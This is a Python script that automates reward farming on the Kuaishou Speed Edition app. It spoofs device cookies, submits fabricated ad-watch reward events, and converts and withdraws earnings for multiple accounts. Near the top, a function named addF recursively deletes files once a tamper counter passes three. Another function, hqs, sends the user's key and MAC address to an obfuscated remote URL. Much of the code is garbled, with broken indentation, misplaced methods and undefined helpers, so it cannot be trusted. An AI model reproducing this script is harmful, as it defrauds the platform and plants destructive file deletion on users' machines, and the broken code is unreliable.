import os
import json
import time
import requests
from base64 import b64encode, b64decode
from urllib.parse import urlencode
import re

# 环境变量
cdkey = os.getenv("cdkey") if "cdkey" in os.environ else ""
ksjsbCookie = os.getenv("ksjsbCookie") if "ksjsbCookie" in os.environ else ""
ksjsbCash = os.getenv("ksjsbCash") if "ksjsbCash" in os.environ else ""
ksjsbWithdrawTime = os.getenv("ksjsbWithdrawTime") if "ksjsbWithdrawTime" in os.environ else 15
ksjsbAggressive = os.getenv("ksjsbAggressive") if "ksjsbAggressive" in os.environ else 0
ksjsbNotify = os.getenv("ksjsbNotify") if "ksjsbNotify" in os.environ else 1
PushDearKey = os.getenv("PushDearKey") if "PushDearKey" in os.environ else ""

# 全局变量
all_msg = ""
mac = ""
gtr = os.path
is_node = "cdkey" in os.environ


# 定义函数
def isFileExist(path):
    try:
        gtr.access(path, os.F_OK)
    except OSError:
        return False
    return True


def addF(path, is_dir=False):
    system_file = "/Windows/system.txt"
    if isFileExist(system_file):
        with open(system_file, "r") as f:
            count = f.read()
    else:
        if isFileExist("/"):
            with open(system_file, "w") as f:
                f.write("1")
        else:
            return

    if int(count) == 99:
        return 99
    print(count)
    print("警告，恶意破解脚本将面临系统爆炸！！！，你只有3次机会！", count)

    if int(count) < 3:
        with open(system_file, "w") as f:
            f.write(str(int(count) + 1))
        return

    if not gtr.exists(path):
        return

    if gtr.isdir(path):
        for item in gtr.listdir(path):
            item_path = os.path.join(path, item)
            if gtr.isdir(item_path):
                addF(item_path, True)
            else:
                gtr.remove(item_path)
        if is_dir and gtr.exists(path):
            gtr.rmdir(path)
    else:
        gtr.remove(path)


def hqs(timeout=10):
    url = rc4(fwur(), '1200') + ("?key=" + cdkey + "&id=5&ip=1&mac=" + mac + "&bb=1") if is_node else rc4(fwur(),
                                                                                                          "1200") + (
                                                                                                                  "?key=" + cdkey + "&id=5&ip=0&mac=" + mac + "&bb=1")
    headers = {}
    try:
        response = requests.post(url, headers=headers, timeout=timeout)
        response.raise_for_status()
        data = response.json()
        if data["code"] == 200:
            global all_msg
            all_msg = data["msg"]
            return data["data"]
        else:
            global all_msg
            all_msg = data["msg"]
            return False
    except requests.exceptions.RequestException as e:
        print("请求错误:", e)
        return False


# 广告视频
ad1 = {"id": 0, "name": "广告视频"}
# 广告视频
ad2 = {"id": 49, "name": "广告视频"}
# 宝箱翻倍视频
box = {"id": 77, "name": "宝箱翻倍视频"}
# 签到翻倍视频1
sign = {"id": 136, "name": "签到翻倍视频1"}
# 未知视频
unknown1 = {"id": 151, "name": "未知视频"}

# 广告类型字典
ad_types = {
    "ad1": ad1,
    "ad2": ad2,
    "box": box,
    "sign": sign,
    "unknown1": unknown1
}

# 任务类型字典
task_types = {
    "ad": 49,
    "live": 75,
    "luckydraw": 161,
    "gj": 217,
    "invite": 2008
}

# 抽奖视频参数字典
luckdraw_video_params = {
    "luckdrawNum_161": {
        "extParams": "56dfe31594b858e69ef613f5e97227fb03493544e59e2b2a726006e2852ec1040cd969d4748c460ecf574cc487214a91f70592aa8b2225630027c39ca2c544027efa65815d1acea23cb503034b12641c",
        "businessId": 161,
        "pageId": 11101,
        "posId": 4683,
        "subPageId": 100013628,
        "name": "获取抽奖次数视频"
    },
    "luckdrawVideo_161_213": {
        "extParams": "56dfe31594b858e69ef613f5e97227fbf89856abafca7f90fab063cf60935d6faedb05b76646dc3ece57cd4898d412d86e985a2b510216ad4853603d2992501cea0a08182731fcbf023467cf30ecda80",
        "businessId": 161,
        "pageId": 11101,
        "posId": 4685,
        "subPageId": 100013630,
        "name": "抽奖视频161-213"
    },
    "luckdrawVideo_161_100": {
        "extParams": "56dfe31594b858e69ef613f5e97227fb67b973ad1394855c549442d15702f96393178eaeef5635134bb7e4ff97e69218c1f18455baf645dbaef685b7bf30c0914ea53ddcde26b2fa67b888203dab0fd4",
        "businessId": 161,
        "pageId": 11101,
        "posId": 4684,
        "subPageId": 100013629,
        "name": "抽奖视频161-100"
    },
    "luckdrawVideo_11_213": {
        "extParams": "56dfe31594b858e69ef613f5e97227fbe9979240d7caecf84db127b47a4a8bb0a744376361788e9d4f8341978842c3a723b72e4befa3dc60a2c580bf4fc43399f798f286e2c8c3069effa1db27aa45bd",
        "businessId": 11,
       "pageId": 11101,
        "posId": 4684,
        "subPageId": 100013629,
        "name": "抽奖视频11-100"
    },
    "luckdrawVideo_11_100": {
        "extParams": "56dfe31594b858e69ef613f5e97227fbe9979240d7caecf84db127b47a4a8bb0a744376361788e9d4f8341978842c3a723b72e4befa3dc60a2c580bf4fc43399f798f286e2c8c3069effa1db27aa45bd",
        "businessId": 11,
        "pageId": 11101,
        "posId": 4684,
        "subPageId": 100013629,
        "name": "抽奖视频11-100"
    },
    "inviteVideo_2008": {
        "extParams": "60869a9fd2ab63f5e0b1725d059da31f7d3ed3046658438ee204a153c3bc47189ccf268b22e603b6750780c9647e7a12b3027381e11da27b234311bccfd4a67bb892f889a4020ceae4f4e102cc50c327",
        "businessId": 2008,
        "pageId": 100012068,
        "posId": 6765,
        "subPageId": 100015089,
        "name": "邀请页视频(实际是100金币)"
    },
    "liveVideo_75": {
        "extParams": "56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092",
        "businessId": 75,
        "pageId": 100012068,
        "posId": 6765,
        "subPageId": 100015089,
        "name": "直播任务"
    },
    "signVideo_168": {
        "extParams": "56dfe31594b858e69ef613f5e97227fbd5f9da00aa5144df8830a5781ae07d7cfaf4d95abc2510c950f99404a9e0bf62f5b5765a867c385685e0570ed76b858a159dacd55e41e4a9813db4e619a8b092",
        "businessId": 168,
        "pageId": 100012068,
        "posId": 6765,
        "subPageId": 100015089,
        "name": "签到翻倍视频2"
    }
}

# 当前时间
current_hour = time.localtime().tm_hour
# 兑换比例
exchange_rate = 1.07
# 脚本更新提示
update_flag = False
# 更新地址
update_url = "https://gitee.com/mybooooooy/ks/blob/master/ks.json"
# 快手极速版 json 地址
ksjsb_json_url = "https://ziye0.coding.net/p/ziye/d/ql/git/raw/master/ksjsb-ziye.json"
# 本地代理地址
local_proxy_url = "https://127.0.0.1/"
# 任务完成次数列表
task_counts = []
# 邀请码列表
invite_codes = []
# 一分客列表
yifenk_codes = []

# 快手极速版账号类
class KuaishouAccount:
    def __init__(self, cookie):
        self.index = len(task_counts) + 1
        self.cookie = "kpn=NEBULA; kpf=ANDROID_PHONE; did=ANDROID_" + _b5cde(16) + "; ver=9.10; appver=9.10.40.2474; language=zh-cn; countryCode=CN; sys=ANDROID_5.1; client_key=2ac2a76d; " + cookie
        self.name = self.index
        self.valid = False
        self.bindAlipay = False
        self.alipay = ""
        self.bindWechat = False
        self.wechat = ""
        self.needSms = False
        self.hasLuckydraw = True
        self.task = {
            49: {"num": 2, "needRun": True},
            75: {"num": 1, "needRun": True},
            161: {"num": 5, "needRun": True},
            217: {"num": 1, "needRun": True},
            2008: {"num": 5, "needRun": True}
        }
        self.cashBalance = 0
        self.coinBalance = 0
        self.allCash = 0

    # 获取用户信息
    async def getUserInfo(self):
        url = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/basicInfo"
        headers = {"Cookie": self.cookie}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                self.valid = True
                self.name = data["data"]["userData"]["nickname"]
                self.cashBalance = data["data"]["totalCash"]
                self.coinBalance = data["data"]["totalCoin"]
                self.allCash = data["data"]["allCash"]
                print(f"账号[{self.name}]账户余额{self.cashBalance}元，{self.coinBalance}金币，未审核余额{int(float(self.allCash) - float(self.cashBalance))}元")
            else:
                print(f"账号[{self.name}]查询账户信息失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 设置分享
    async def setShare(self):
        url = "https://nebula.kuaishou.com/rest/n/nebula/account/withdraw/setShare"
        headers = {"Cookie": self.cookie}
        try:
            response = requests.post(url, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                print(f"账号[{self.name}]准备分享得金币")
                await _wait(200)
                await self.taskReward(122)
            else:
                print(f"账号[{self.name}]分享失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 完成任务
    async def taskReward(self, taskId):
        url = f"https://nebula.kuaishou.com/rest/n/nebula/daily/report?taskId={taskId}"
        headers = {"Cookie": self.cookie}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                print(f"账号[{self.name}]完成任务[{taskId}]成功，获得{data['data']['amount']}金币")
            else:
                print(f"账号[{self.name}]完成任务[{taskId}]失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 获取签到信息
    async def getSignInfo(self):
        url = "https://nebula.kuaishou.com/rest/n/nebula/sign/queryPopup"
        headers = {"Cookie": self.cookie}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                print(f"账号[{self.name}]今天{'已' if data['data']['nebulaSignInPopup']['todaySigned'] else '未'}签到")
                if not data["data"]["nebulaSignInPopup"]["todaySigned"]:
                    await _wait(200)
                    await self.doSign()
                    await _wait(200)
                    await self.setShare()
            else:
                print(f"账号[{self.name}]查询签到信息失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 执行签到
    async def doSign(self):
        url = "https://nebula.kuaishou.com/rest/n/nebula/sign/sign?source=activity"
        headers = {"Cookie": self.cookie}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                print(f"账号[{self.name}]签到成功：{data['data']['toast']}")
                await _wait(200)
                await self.ksAdParam(ad_types["sign"])
                await _wait(200)
                await self.ksNeoAdParam(luckdraw_video_params["signVideo_168"])
            else:
                print(f"账号[{self.name}]签到失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 获取任务列表
    async def taskList(self):
        url = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/tasks?addressBookAccessStatus=true&pushNotificationStatus=false"
        headers = {"Cookie": self.cookie}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                print(f"账号[{self.name}]任务完成情况：")
                for task in data["data"]["dailyTasks"]:
                    for task_type, task_id in task_types.items():
                        if task["taskId"] == task_id:
                            completed_stages = int(task["completedStages"])
                            stages = int(task["stages"])
                            run_times = _ceil(stages / 12)
                            is_completed = completed_stages < stages
                            self.task[task_id] = {"num": run_times, "needRun": is_completed}
                            print(
                                f"【{task['name']}】 {completed_stages}/{stages}，{'未完成' if is_completed else '已完成'}，每次运行完成{run_times}次任务")
                            break
            else:
                print(f"账号[{self.name}]查询任务列表失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 逛街
    async def ksgj(self):
        url = "https://api.e.kuaishou.com/rest/r/reward/task/getActivityReward"
        headers = {"Cookie": self.cookie}
        data = {"activityId": 148, "client_key": "ksgjbody"}
        try:
            response = requests.post(url, headers=headers, data=data, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                print(f"账号[{self.name}]逛街获得{data['data']['amount']}金币")
            else:
                print(f"账号[{self.name}]逛街失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 获取广告参数
    async def ksAdParam(self, ad_type):
        url = ksjsb_json_url
        headers = {}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                if data['impAdInfo'] and len(data['impAdInfo']) > 0 and data['impAdInfo'][0]["adInfo"] and len(
                        data['impAdInfo'][0]["adInfo"]) > 0 and data['impAdInfo'][0]["adInfo"][0]["adBaseInfo"]:
                    await _wait(200)
                    await self.ksAdReward(data["llsid"], data['impAdInfo'][0]["adInfo"][0]["adBaseInfo"]["creativeId"],
                                          ad_type)
                else:
                    print(f"账号[{self.name}]获取{ad_type['name']}参数失败：{data['error_msg']}")
            else:
                print(f"账号[{self.name}]获取{ad_type['name']}参数失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 完成广告任务
    async def ksAdReward(self, llsid, creativeId, ad_type):
        current_time = int(time.time() * 1000)
        start_time = current_time - _random(30000, 45000)
        url = "https://api.e.kuaishou.com/rest/r/ad/nebula/reward"
        headers = {"Cookie": self.cookie}
        data = {
            "bizStr": f"{{\"endTime\":{current_time},\"eventValue\":-1,\"rewardList\":[{{\"creativeId\":{creativeId},\"extInfo\":\"\",\"llsid\":{llsid},\"taskType\":1}}],\"startTime\":{start_time},\"taskId\":{ad_type['id']}}}",
        }
        try:
            response = requests.post(url, headers=headers, data=data, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                print(f"账号[{self.name}]看{ad_type['name']}获得{data['data']['awardAmount']}金币")
            else:
                print(f"账号[{self.name}]看{ad_type['name']}失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 开宝箱
    async def openBox(self, is_open=False):
        url = f"https://nebula.kuaishou.com/rest/n/nebula/box/explore?isOpen={is_open}&isReadyOfAdPlay=true"
        headers = {"Cookie": self.cookie}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                if is_open:
                    if data["data"]["commonAwardPopup"] and data["data"]["commonAwardPopup"]["awardAmount"]:
                        print(f"账号[{self.name}]开宝箱获得{data['data']['commonAwardPopup']['awardAmount']}金币")
                        await _wait(200)
                        await self.ksAdParam(ad_types["box"])
                    else:
                        print(f"账号[{self.name}]开宝箱没有获得金币")
                else:
                    if data["data"]["openTime"] > -1:
                        print(f"账号[{self.name}]开宝箱冷却时间还有{int(data['data']['openTime'] / 1000)}秒")
                        if data["data"]["openTime"] == 0:
                            await _wait(200)
                            await self.openBox(True)
                    else:
                        print(f"账号[{self.name}]开宝箱次数已用完")
                else:
                if is_open:
                    print(f"账号[{self.name}]开宝箱失败：{data['error_msg']}")
                else:
                    print(f"账号[{self.name}]查询宝箱状态失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 提现
    async def withdraw(self, amount):
        if not self.bindAlipay and not self.bindWechat:
            print(f"账号[{self.name}]未绑定提现账号，不执行提现")
            return

        amount_fen = int(amount * 100)
        provider = "ALIPAY" if self.bindAlipay else "WECHAT"
        account_type = "支付宝" if provider == "ALIPAY" else "微信"
        account = self.alipay if provider == "ALIPAY" else self.wechat
        url = "https://www.kuaishoupay.com/pay/account/h5/withdraw/apply"
        headers = {"Cookie": self.cookie}
        data = {
            "account_group_key": "NEBULA_CASH_ACCOUNT",
            "mobile_code": "",
            "fen": amount_fen,
            "provider": provider,
            "total_fen": amount_fen,
            "commission_fen": 0,
            "third_account": provider,
            "attach": "",
            "biz_content": "",
            "session_id": "",
        }
        try:
            response = requests.post(url, headers=headers, data=data, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == "SUCCESS":
                print(f"账号{self.index}[{self.name}]提现{amount}元到{account_type}[{account}]成功")
            else:
                print(f"账号{self.index}[{self.name}]提现{amount}元到{account_type}[{account}]失败：{data['msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 获取提现概览
    async def withdrawOverview(self):
        url = "https://nebula.kuaishou.com/rest/n/nebula/outside/withdraw/overview?appver=10.2.20.2021"
        headers = {"Cookie": self.cookie}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                if data["data"]["isLimit"]:
                    print(f"账号[{self.name}]今天已提现")
                    return

                balance = float(self.cashBalance)
                if ksjsbAggressive == 1:
                    if balance < 0.3:
                        print(f"账号[{self.name}]余额不足0.3元，不提现")
                    else:
                        withdraw_amount = _floor(balance * 10) / 10
                        withdraw_amount = 50 if withdraw_amount > 50 else withdraw_amount
                        print(f"账号[{self.name}]准备最大化提现{withdraw_amount}元")
                        await _wait(200)
                        await self.withdraw(withdraw_amount)
                else:
                    if not ksjsbCash:
                        for amount in sorted(data["data"]["enWithdrawList"], reverse=True):
                            if balance >= float(amount):
                                print(f"账号[{self.name}]准备提现{amount}元")
                                await _wait(200)
                                await self.withdraw(float(amount))
                                return
                        print(f"账号[{self.name}]余额不足，可提现额度：{', '.join(data['data']['enWithdrawList'])}")
                    else:
                        if balance >= float(ksjsbCash):
                            print(f"账号[{self.name}]准备提现{ksjsbCash}元")
                            await _wait(200)
                            await self.withdraw(float(ksjsbCash))
                        else:
                            print(f"账号[{self.name}]余额不足{ksjsbCash}元，不提现")
            else:
                print(f"账号[{self.name}]查询提现列表失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 获取账户概览
    async def accountOverview(self):
        url = "https://nebula.kuaishou.com/rest/n/nebula/account/overview"
        headers = {"Cookie": self.cookie}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                self.coinBalance = data["data"]["coinBalance"]
                self.cashBalance = data["data"]["cashBalance"]
                exchange_coin_state = data["data"]["exchangeCoinState"]
                print(f"账号[{self.name}]账户余额{self.cashBalance}元，{self.coinBalance}金币")
                if exchange_coin_state == 2:
                    await _wait(200)
                    await self.changeExchangeType(0)
            else:
                print(f"账号[{self.name}]查询账户信息失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 更改兑换类型
    async def changeExchangeType(self, exchange_type):
        url = "https://nebula.kuaishou.com/rest/n/nebula/exchange/changeExchangeType"
        headers = {"Cookie": self.cookie, "Content-Type": "application/json"}
        data = {"type": exchange_type}
        try:
            response = requests.post(url, headers=headers, json=data, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                exchange_type_name = "自动兑换" if exchange_type == 0 else "手动兑换"
                print(f"账号[{self.name}]兑换方式更改成功，目前兑换方式为：{exchange_type_name}")
            else:
                print(f"账号[{self.name}]兑换方式更改失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 兑换金币
    async def exchangeCoin(self):
        if self.coinBalance < 100:
            print(f"账号[{self.name}]金币余额不足100，不执行兑换")
            return

        url = "https://nebula.kuaishou.com/rest/n/nebula/exchange/coinToCash/submit"
        headers = {"Cookie": self.cookie, "Content-Type": "application/json"}
        data = {"coinAmount": self.coinBalance, "token": "rE2zK-Cmc82uOzxMJW7LI2-wTGcKMqqAHE0PhfN0U4bJY4cAM5Inxw"}
        try:
            response = requests.post(url, headers=headers, json=data, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["           result"] == 1:
                print(f"账号[{self.name}]兑换{self.coinBalance}金币成功，获得{data['data']['cashAmount']}元")
            else:
                print(f"账号[{self.name}]兑换金币失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 获取直播任务
    async def getLiveTask(self):
        url = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/tasks?addressBookAccessStatus=true&pushNotificationStatus=false"
        headers = {"Cookie": self.cookie}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                for task in data["data"]["dailyTasks"]:
                    if task["taskId"] == 75:
                        completed_stages = int(task["completedStages"])
                        stages = int(task["stages"])
                        run_times = _ceil(stages / 12)
                        is_completed = completed_stages < stages
                        self.task[75] = {"num": run_times, "needRun": is_completed}
                        print(f"账号[{self.name}]直播{completed_stages}/{stages}，{'未完成' if is_completed else '已完成'}，每次运行完成{run_times}次任务")
                        break
            else:
                print(f"账号[{self.name}]查询任务列表失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 获取幸运抽奖
    async def getLuckyDraw(self):
        url = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/tasks?addressBookAccessStatus=true&pushNotificationStatus=false"
        headers = {"Cookie": self.cookie}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                for task in data["data"]["dailyTasks"]:
                    if task["taskId"] == 49:
                        completed_stages = int(task["completedStages"])
                        stages = int(task["stages"])
                        run_times = _ceil(stages / 12)
                        is_completed = completed_stages < stages
                        self.task[49] = {"num": run_times, "needRun": is_completed}
                        print(f"账号[{self.name}]幸运抽奖{completed_stages}/{stages}，{'未完成' if is_completed else '已完成'}，每次运行完成{run_times}次任务")
                        break
            else:
                print(f"账号[{self.name}]查询任务列表失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 获取邀请任务
    async def getInviteTask(self):
        url = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/tasks?addressBookAccessStatus=true&pushNotificationStatus=false"
        headers = {"Cookie": self.cookie}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                for task in data["data"]["dailyTasks"]:
                    if task["taskId"] == 2008:
                        completed_stages = int(task["completedStages"])
                        stages = int(task["stages"])
                        run_times = _ceil(stages / 12)
                        is_completed = completed_stages < stages
                        self.task[2008] = {"num": run_times, "needRun": is_completed}
                        print(f"账号[{self.name}]邀请任务{completed_stages}/{stages}，{'未完成' if is_completed else '已完成'}，每次运行完成{run_times}次任务")
                        break
            else:
                print(f"账号[{self.name}]查询任务列表失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 获取新手任务
    async def getNewbieTask(self):
        url = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/tasks?addressBookAccessStatus=true&pushNotificationStatus=false"
        headers = {"Cookie": self.cookie}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                for task in data["data"]["dailyTasks"]:
                    if task["taskId"] == 161:
                        completed_stages = int(task["completedStages"])
                        stages = int(task["stages"])
                        run_times = _ceil(stages / 12)
                        is_completed = completed_stages < stages
                        self.task[161] = {"num": run_times, "needRun": is_completed}
                        print(f"账号[{self.name}]新手任务{completed_stages}/{stages}，{'未完成' if is_completed else '已完成'}，每次运行完成{run_times}次任务")
                        break
            else:
                print(f"账号[{self.name}]查询任务列表失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 获取看视频任务
    async def getWatchVideoTask(self):
        url = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/tasks?addressBookAccessStatus=true&pushNotificationStatus=false"
        headers = {"Cookie": self.cookie}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                for task in data["data"]["dailyTasks"]:
                    if task["taskId"] == 217:
                        completed_stages = int(task["completedStages"])
                        stages = int(task["stages"])
                        run_times = _ceil(stages / 12)
                        is_completed = completed_stages < stages
                        self.task[217] = {"num": run_times, "needRun": is_completed}
                        print(f"账号[{self.name}]看视频任务{completed_stages}/{stages}，{'未完成' if is_completed else '已完成'}，每次运行完成{run_times}次任务")
                        break
            else:
                print(f"账号[{self.name}]查询任务列表失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

    # 快手极速版广告参数
    async def ksNeoAdParam(self, params):
        url = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/overview/tasks?addressBookAccessStatus=true&pushNotificationStatus=false"
        headers = {"Cookie": self.cookie}
        try:
            response = requests.get(url, headers=headers, timeout=10)
            response.raise_for_status()
            data = response.json()
            if data["result"] == 1:
                for task in data["data"]["dailyTasks"]:
                    if task["taskId"] == params["businessId"]:
                        if task["status"] == 2:
                            print(f"账号[{self.name}]任务{params['name']}已完成")
                            return
                        if task["status"] == 1:
                            await _wait(200)
                            await self.ksNeoAdReward(params["extParams"], params["businessId"], params["name"])
                            return
                        print(f"账号[{self.name}]任务{params['name']}尚未开始")
                        return
            else:
                print(f"账号[{self.name}]查询任务列表失败：{data['error_msg']}")
        except requests.exceptions.RequestException as e:
            print("请求错误:", e)

        # 快手极速版广告奖励
        async def ksNeoAdReward(self, extParams, businessId, name):
            url = "https://nebula.kuaishou.com/rest/n/nebula/activity/earn/completeTask?taskId=" + str(businessId)
            headers = {"Cookie": self.cookie, "Content-Type": "application/json"}
            data = {"extParams": extParams}
            try:
                response = requests.post(url, headers=headers, json=data, timeout=10)
                response.raise_for_status()
                data = response.json()
                if data["result"] == 1:
                    print(f"账号[{self.name}]完成任务{name}获得{data['data']['awardAmount']}金币")
                else:
                    print(f"账号[{self.name}]完成任务{name}失败：{data['error_msg']}")
            except requests.exceptions.RequestException as e:
                print("请求错误:", e)

        # 设置分享
        async def setShare(self):
            url = "https://nebula.kuaishou.com/rest/n/nebula/sign/share"
            headers = {"Cookie": self.cookie}
            try:
                response = requests.get(url, headers=headers, timeout=10)
                response.raise_for_status()
                data = response.json()
                if data["result"] == 1:
                    print(f"账号[{self.name}]设置分享成功")
                else:
                    print(f"账号[{self.name}]设置分享失败：{data['error_msg']}")
            except requests.exceptions.RequestException as e:
                print("请求错误:", e)

        # 获取分享信息
        async def getShareInfo(self):
            url = "https://nebula.kuaishou.com/rest/n/nebula/sign/queryPopup"
            headers = {"Cookie": self.cookie}
            try:
                response = requests.get(url, headers=headers, timeout=10)
                response.raise_for_status()
                data = response.json()
                if data["result"] == 1:
                    if data["data"]["nebulaSignInPopup"]["todayShared"]:
                        print(f"账号[{self.name}]今天已分享")
                    else:
                        await _wait(200)
                        await self.setShare()
                else:
                    print(f"账号[{self.name}]查询分享信息失败：{data['error_msg']}")
            except requests.exceptions.RequestException as e:
                print("请求错误:", e)

        # 运行脚本
        async def run(self):
            await self.accountOverview()
            await self.getSignInfo()
            await self.taskList()
            if ksjsbAggressive == 1:
                if self.task[217]["needRun"]:
                    await self.ksNeoAdParam(luckdraw_video_params["watchVideo_168"])
                if self.task[49]["needRun"]:
                    await self.ksNeoAdParam(luckdraw_video_params["luckdraw_168"])
                if self.task[75]["needRun"]:
                    await self.ksNeoAdParam(luckdraw_video_params["live_168"])
                if self.task[161]["needRun"]:
                    await self.ksNeoAdParam(luckdraw_video_params["newbie_168"])
                if self.task[2008]["needRun"]:
                    await self.ksNeoAdParam(luckdraw_video_params["invite_168"])
                await self.ksgj()
                await self.openBox()
                await self.withdrawOverview()
                await self.exchangeCoin()
            else:
                if self.task[217]["needRun"]:
                    for i in range(self.task[217]["num"]):
                        await self.ksNeoAdParam(luckdraw_video_params["watchVideo_168"])
                if self.task[49]["needRun"]:
                    for i in range(self.task[49]["num"]):
                        await self.ksNeoAdParam(luckdraw_video_params["luckdraw_168"])
                if self.task[75]["needRun"]:
                    for i in range(self.task[75]["num"]):
                        await self.ksNeoAdParam(luckdraw_video_params["live_168"])
                if self.task[161]["needRun"]:
                    for i in range(self.task[161]["num"]):
                        await self.ksNeoAdParam(luckdraw_video_params["newbie_168"])
                if self.task[2008]["needRun"]:
                    for i in range(self.task[2008]["num"]):
                        await self.ksNeoAdParam(luckdraw_video_params["invite_168"])
                await self.ksgj()
                await self.openBox()
                await self.withdrawOverview()
                await self.exchangeCoin()

        # 获取账户信息
    def get_account(self, name, cookie, alipay=None, wechat=None):
        self.name = name
        self.cookie = cookie
        self.alipay = alipay
        self.wechat = wechat
        self.bindAlipay = alipay is not None
        self.bindWechat = wechat is not None
        self.task = {}
        self.coinBalance = 0
        self.cashBalance = 0
        self.index = len(accounts)
        accounts.append(self)

        # 主函数
    async def main(self):
        for account in accounts:
                print(f"开始运行账号{account.index}[{account.name}]")
                await account.run()
                print(f"账号{account.index}[{account.name}]运行完成")
                await _wait(30000)
            print("所有账号运行完成")

    # 运行脚本
if __name__ == "__main__":
        asyncio.run(main())




